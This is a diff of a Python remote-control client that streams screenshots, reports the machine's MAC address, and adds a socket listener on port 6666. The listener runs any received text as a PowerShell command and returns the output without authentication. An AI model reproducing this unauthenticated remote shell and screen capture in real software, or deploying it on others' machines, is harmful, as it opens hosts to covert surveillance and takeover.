@@ -1,16 +1,20 @@
 import socket
+import sys
+
 import lz4.frame
 from getmac import get_mac_address as gma
 import random
 from screeninfo import get_monitors
 from threading import Thread
 from mss import mss
+import subprocess
+import threading
 
-
-HOST = "192.168.0.129"  # The server's hostname or IP address
+HOST = "192.168.1.25"  # The server's hostname or IP address
 PORT = 65432  # The port used by the server
 
 
+result = ""
 list_of_ports = range(20000, 60000)
 
 def return_not_used_port():
@@ -24,13 +28,14 @@ def return_not_used_port():
 
     return port
 
+
 def is_port_in_use(port: int) -> bool:
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         return s.connect_ex(('localhost', port)) == 0
 
 
 def start_listening_for_commands(running_port):
-   send_computer_information(running_port)
+    send_computer_information(running_port)
 
 
 def send_computer_information(running_port):
@@ -51,7 +56,7 @@ def get_screen_width_height():
     width = ""
     height = ""
     for monitor in get_monitors():
-        #print(str(monitor))
+        # print(str(monitor))
         # FOR TESTING THE PRIMARY MONITOR IS FALSE ( SECOND SCREEN )
         if str(monitor.is_primary) == "False":
             width = monitor.width
@@ -59,16 +64,14 @@ def get_screen_width_height():
 
     return width, height
 
+
 def retreive_screen(conn, width, height):
     with mss() as mss_instance:
         recording_area = {'top': 0, 'left': 0, 'width': width, 'height': height}
         # Retrieve monitor instead of a specific area
         monitor_1 = mss_instance.monitors[2]
 
-
         while "recording":
-
-
             # Grab the screen with the dimensions of the recording_area
             image = mss_instance.grab(monitor_1)
 
@@ -111,18 +114,59 @@ def socket_listening(host, port):
         finally:
             conn.close()
 
-            #sock.close()
+            # sock.close()
+
+
+def recvall(conn, length):
+    buf = b''
+    while len(buf) < length:
+        data = conn.recv(length - len(buf))
+        if not data:
+            return data
+        buf += data
+    return buf
+
+
+def run_command(command):
+    command_result = subprocess.run(["powershell", "-Command", command], capture_output=True)
+    global result
+    result = command_result.stdout
+    return command_result.stdout
+
+
+def command_line_service(host, port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((host, port))
+
+        try:
+            sock.listen(5)
+            print('Server started.')
+
+            while 'connected':
+                conn, addr = sock.accept()
+                print('Client connected IP:', addr)
+                command = conn.recv(1024)
+                thread = Thread(target=run_command, args=(command,))
+                thread.start()
+                thread.join()
+                global result
+                conn.sendall(result)
+
+        finally:
+            conn.close()
+
+            # sock.close()
+
 
 def main():
     running_port = return_not_used_port()
+    running_port = 6666
     print(running_port)
     send_computer_information(running_port)
-    #width, height = get_screen_width_height()
-    socket_listening("192.168.0.129", running_port)
-
-
-
-
+    # width, height = get_screen_width_height()
+    # socket_listening("192.168.0.129", running_port)
+    command_line_service("192.168.1.25", running_port)
 
 
 if __name__ == '__main__':
